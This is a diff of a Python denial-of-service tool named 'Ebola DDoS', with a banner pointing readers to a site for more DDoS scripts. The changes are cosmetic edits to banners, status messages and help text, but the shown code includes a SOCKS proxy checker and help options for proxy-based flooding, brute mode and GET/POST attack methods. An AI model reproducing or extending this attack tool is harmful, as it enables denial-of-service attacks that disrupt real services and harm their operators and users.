@@ -1,11 +1,9 @@
-#############################################################
 #    #################################################      #
 ##           Ebola DDoS Will Stop Update For While         ##         
 ##   So This Update Will Be Last Version For A Long Time   ##
 ##        Visit Our Home Page For More DDoS/DoS Script     ##
 #             ---> https://freethecode.cf/ <---             #
 #    ###################################################    #
-#############################################################
 import socket
 import threading
 import random
@@ -21,7 +19,7 @@ else:
 
 print("""
       ▓█████  ▄▄▄▄    ▒█████   ██▓    ▄▄▄   Ebola DDoS Tool Code By 413xPr06605.
-3     ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██▒   ▒████▄        Linux/Windows Both Supported.
+3     ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██▒   ▒████▄         This Version Only For Linux.
  1    ▒███   ▒██▒ ▄██▒██░  ██▒▒██░   ▒██  ▀█▄                Socks4/5 Supported.
 8 4   ▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██░   ░██▄▄▄▄██                Version ~ # 1.5.0,
  2    ░▒████▒░▓█  ▀█▓░ ████▓▒░░██████▒▓█   ▓██▒
@@ -243,7 +241,7 @@ def checking_socks(lines,):
             s.send(str.encode("GET / HTTP/1.1\r\nHost: "+host+"\r\n\r\n"))
             s.close()
             suc +=1
-            print("[%s] Connection-[Sucess]"%(proxy[0]))
+            print("[%s] Connection-[Connected]"%(proxy[0]))
             print('\33]0;[%s] EbolaVirus-[Load]\a'%(suc),end='')
             break
         except:
@@ -340,14 +338,14 @@ if len(sys.argv) < 5:
     print("        --help For More Information\n")
     if len(sys.argv) ==2:
         if str(sys.argv[1]) =="--help":
-            print("--install   | Auto Install Module")
-            print("--createmap | Launch Proxy Map Setup")
-            print("--check     | Check Socks Connection")
-            print("--clone     | Download Socks List")
-            print("--file      | Input Custom Socks File")
-            print("--brute     | Enable Brute Mode")
-            print("--socks4    | Using Socks4 DDoS")
-            print("--socks5    | Using Socks5 DDoS")
+            print(" --install   | Auto Install Module")
+            print(" --createmap | Launch Proxy Map Setup")
+            print(" --check     | Check Socks Connection")
+            print(" --clone     | Download Socks List")
+            print(" --file      | Input Custom Socks File")
+            print(" --brute     | Enable Brute Mode")
+            print(" --socks4    | Using Socks4 DDoS")
+            print(" --socks5    | Using Socks5 DDoS")
             print("\nAttacking Method Can Be Change Like\n")
             print("-> --method=GET")
             print("-> --method=POST")
@@ -482,6 +480,8 @@ time.sleep(1)
 print("Port => %s"%(port))
 time.sleep(1)
 print("Socks Version => %s"%(sock_version))
+time.sleep(1)
+print("Total Ebola Socks => %s"%(len(proxies)))
 time.sleep(1)
 print("Request Method => %s"%(attack_type))
 if brute =="ON":
